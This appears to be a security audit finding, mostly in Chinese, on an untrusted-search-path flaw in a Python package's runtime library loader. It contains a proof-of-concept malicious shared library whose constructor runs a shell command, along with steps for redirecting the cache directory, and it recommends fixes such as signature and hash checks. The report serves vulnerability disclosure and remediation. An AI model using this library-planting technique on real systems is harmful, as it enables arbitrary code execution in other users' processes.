# VULN-SEC-RT-001: 动态库加载漏洞

## 漏洞概述

**漏洞类型**: 不可信搜索路径  
**CWE**: CWE-426 (Untrusted Search Path)  
**严重程度**: Critical  
**置信度**: 85%

### 影响文件

- **文件**: `python/asc/lib/runtime/state.py`
- **行号**: 50
- **函数**: `RuntimeInterface.__init__`

### 漏洞描述

Dynamic library loading from untrusted cache path without validation. `ctypes.CDLL` loads `.so` files from a cache directory controlled by `PYASC_CACHE_DIR` environment variable. No signature verification or integrity check is performed before loading, allowing an attacker to inject malicious shared libraries if they can manipulate the cache directory.

---

## 完整攻击链分析

### 数据流追踪

```
[污点源: 环境变量]
PYASC_HOME / PYASC_CACHE_DIR
    ↓
cache.py:22-23 → CacheOptions 初始化
    ↓
cache.py:47 → FileCacheManager.cache_dir = cache_options.dir
    ↓
state.py:37 → cache_manager = get_cache_manager(key)
    ↓
state.py:39 → rt_lib = cache_manager.get_file(f"lib{wrapper_name}{suffix}")
    ↓
[返回攻击者控制的库文件路径]
    ↓
state.py:50 → self.lib = ctypes.CDLL(rt_lib, ctypes.RTLD_GLOBAL)
    ↓
[污点汇: 动态库加载]
    ↓
[恶意 .so 文件的 __attribute__((constructor)) 自动执行]
```

### 关键代码片段

```python
# state.py:27-50
class RuntimeInterface:
    def __init__(self, is_model: bool, soc: config.Platform) -> None:
        dirname = os.path.dirname(os.path.realpath(__file__))
        wrapper_name = "rt_wrapper"
        src = Path(os.path.join(dirname, f"{wrapper_name}.cpp")).read_text()
        
        # 计算缓存 key
        key = hashlib.sha256((src + suffix_key + str(is_model)).encode("utf-8")).hexdigest()
        cache_manager = get_cache_manager(key)
        suffix = sysconfig.get_config_var("EXT_SUFFIX")
        rt_lib = cache_manager.get_file(f"lib{wrapper_name}{suffix}")
        
        # 如果缓存不存在，编译新库
        if rt_lib is None:
            with tempfile.TemporaryDirectory() as tmpdir:
                ...
                so = build_npu_ext(wrapper_name, is_model, soc, src_path, tmpdir)
                rt_lib = cache_manager.put(...)
        
        # 危险: 直接加载缓存中的库
        self.lib: ctypes.CDLL = ctypes.CDLL(rt_lib, ctypes.RTLD_GLOBAL)
```

---

## PoC 构造思路

### 步骤 1: 创建恶意共享库

```c
// malicious_rt_wrapper.c
#include <stdio.h>
#include <stdlib.h>

// constructor 在库加载时自动执行
__attribute__((constructor))
void malicious_init() {
    // 执行恶意代码
    system("id > /tmp/pwned");
    printf("Malicious library loaded!\n");
}

// 提供一些正常函数以避免崩溃
int some_function() {
    return 0;
}
```

编译为共享库：
```bash
gcc -shared -fPIC -o librt_wrapper.cpython-39-x86_64-linux-gnu.so malicious_rt_wrapper.c
```

### 步骤 2: 控制缓存目录

```bash
export PYASC_CACHE_DIR=/tmp/attacker_cache
```

### 步骤 3: 计算缓存 key 并放置恶意文件

缓存 key 是源代码内容的 SHA256 hash。攻击者需要：
1. 获取 `rt_wrapper.cpp` 源代码内容
2. 计算 SHA256 hash
3. 创建对应的缓存目录结构

```bash
# 缓存目录结构: <cache_base>/<base32_hash>/librt_wrapper<suffix>.so
mkdir -p /tmp/attacker_cache/<computed_cache_key>
cp librt_wrapper.cpython-39-x86_64-linux-gnu.so /tmp/attacker_cache/<computed_cache_key>/librt_wrapper.cpython-39-x86_64-linux-gnu.so
```

### 步骤 4: 触发加载

```python
import asc
# pyasc 运行时初始化会自动调用 RuntimeInterface.__init__
# 触发 ctypes.CDLL 加载恶意库
```

---

## 利用条件分析

| 条件 | 要求 | 说明 |
|------|------|------|
| 攻击者位置 | 本地 | 需要设置环境变量或写入文件 |
| 权限要求 | 用户级 | 环境变量设置不需要特殊权限 |
| 文件写入 | 需要 | 需要写入恶意 .so 文件 |
| key 计算 | 需要 | 需要计算正确的缓存 key |
| 用户交互 | 无 | pyasc 初始化自动触发 |

---

## 影响分析

### 安全影响

1. **任意代码执行**: constructor 函数以 pyasc 进程权限执行
2. **持久化**: 恶意代码在每次 pyasc 初始化时执行
3. **隐蔽性**: 恶意库可以同时提供正常功能

### 与其他漏洞的关联

此漏洞与以下漏洞共享相同的攻击向量：
- VULN-lib_runtime-001: 相同漏洞，不同描述
- VULN-lib_runtime-002: importlib 模块加载（相同缓存路径）
- VULN-lib_runtime-003: PrintInterface 加载（相同缓存路径）
- VULN-CROSS-004: 缓存完整性攻击链

---

## 修复建议

### 优先级 1: 库签名验证

```python
import subprocess
import hashlib

def verify_library_signature(lib_path: str) -> bool:
    # 方案 1: GPG 签名验证
    sig_file = lib_path + '.sig'
    if os.path.exists(sig_file):
        result = subprocess.run(['gpg', '--verify', sig_file, lib_path], capture_output=True)
        return result.returncode == 0
    
    # 方案 2: HMAC 签名
    # 在编译时生成签名，加载时验证
    return False

def load_library_with_verification(lib_path: str) -> ctypes.CDLL:
    if not verify_library_signature(lib_path):
        raise RuntimeError(f"Library signature verification failed: {lib_path}")
    return ctypes.CDLL(lib_path, ctypes.RTLD_GLOBAL)
```

### 优先级 2: 固定缓存目录

```python
# 不允许环境变量覆盖缓存目录
SAFE_CACHE_DIR = os.path.expanduser("~/.pyasc/cache")

def get_cache_manager(key: str) -> CacheManager:
    # 强制使用安全缓存目录
    cache_dir = SAFE_CACHE_DIR
    
    # 检测并警告危险配置
    env_cache = os.getenv('PYASC_CACHE_DIR')
    if env_cache and env_cache != SAFE_CACHE_DIR:
        warnings.warn(f"PYASC_CACHE_DIR={env_cache} is ignored for security. Using {SAFE_CACHE_DIR}")
    
    return FileCacheManager(key, cache_dir)
```

### 优先级 3: 库内容 hash 验证

```python
def verify_library_hash(lib_path: str, expected_hash: str) -> bool:
    with open(lib_path, 'rb') as f:
        actual_hash = hashlib.sha256(f.read()).hexdigest()
    return actual_hash == expected_hash

# 在源代码 hash 中包含编译产物的预期 hash
# 加载时验证
if not verify_library_hash(rt_lib, expected_lib_hash):
    raise RuntimeError("Library content hash mismatch - possible tampering")
```

### 优先级 4: 安全编译策略

```python
# 在临时目录编译，验证后再移动到缓存
def build_and_cache_library(...):
    with tempfile.TemporaryDirectory() as tmpdir:
        so_path = build_npu_ext(...)
        
        # 验证编译产物
        if not validate_compiled_library(so_path):
            raise RuntimeError("Compiled library validation failed")
        
        # 签名后存储
        signed_so = sign_library(so_path)
        cache_manager.put(signed_so, ...)
```

---

## 相关漏洞

- **VULN-lib_runtime-001**: Unsafe Dynamic Library Loading（相同漏洞）
- **VULN-lib_runtime-002**: Unsafe Dynamic Module Loading（类似攻击向量）
- **VULN-lib_runtime-003**: PrintInterface Unsafe Loading（类似攻击向量）
- **VULN-CROSS-001**: 跨模块环境变量攻击链
- **VULN-CROSS-004**: 缓存完整性攻击链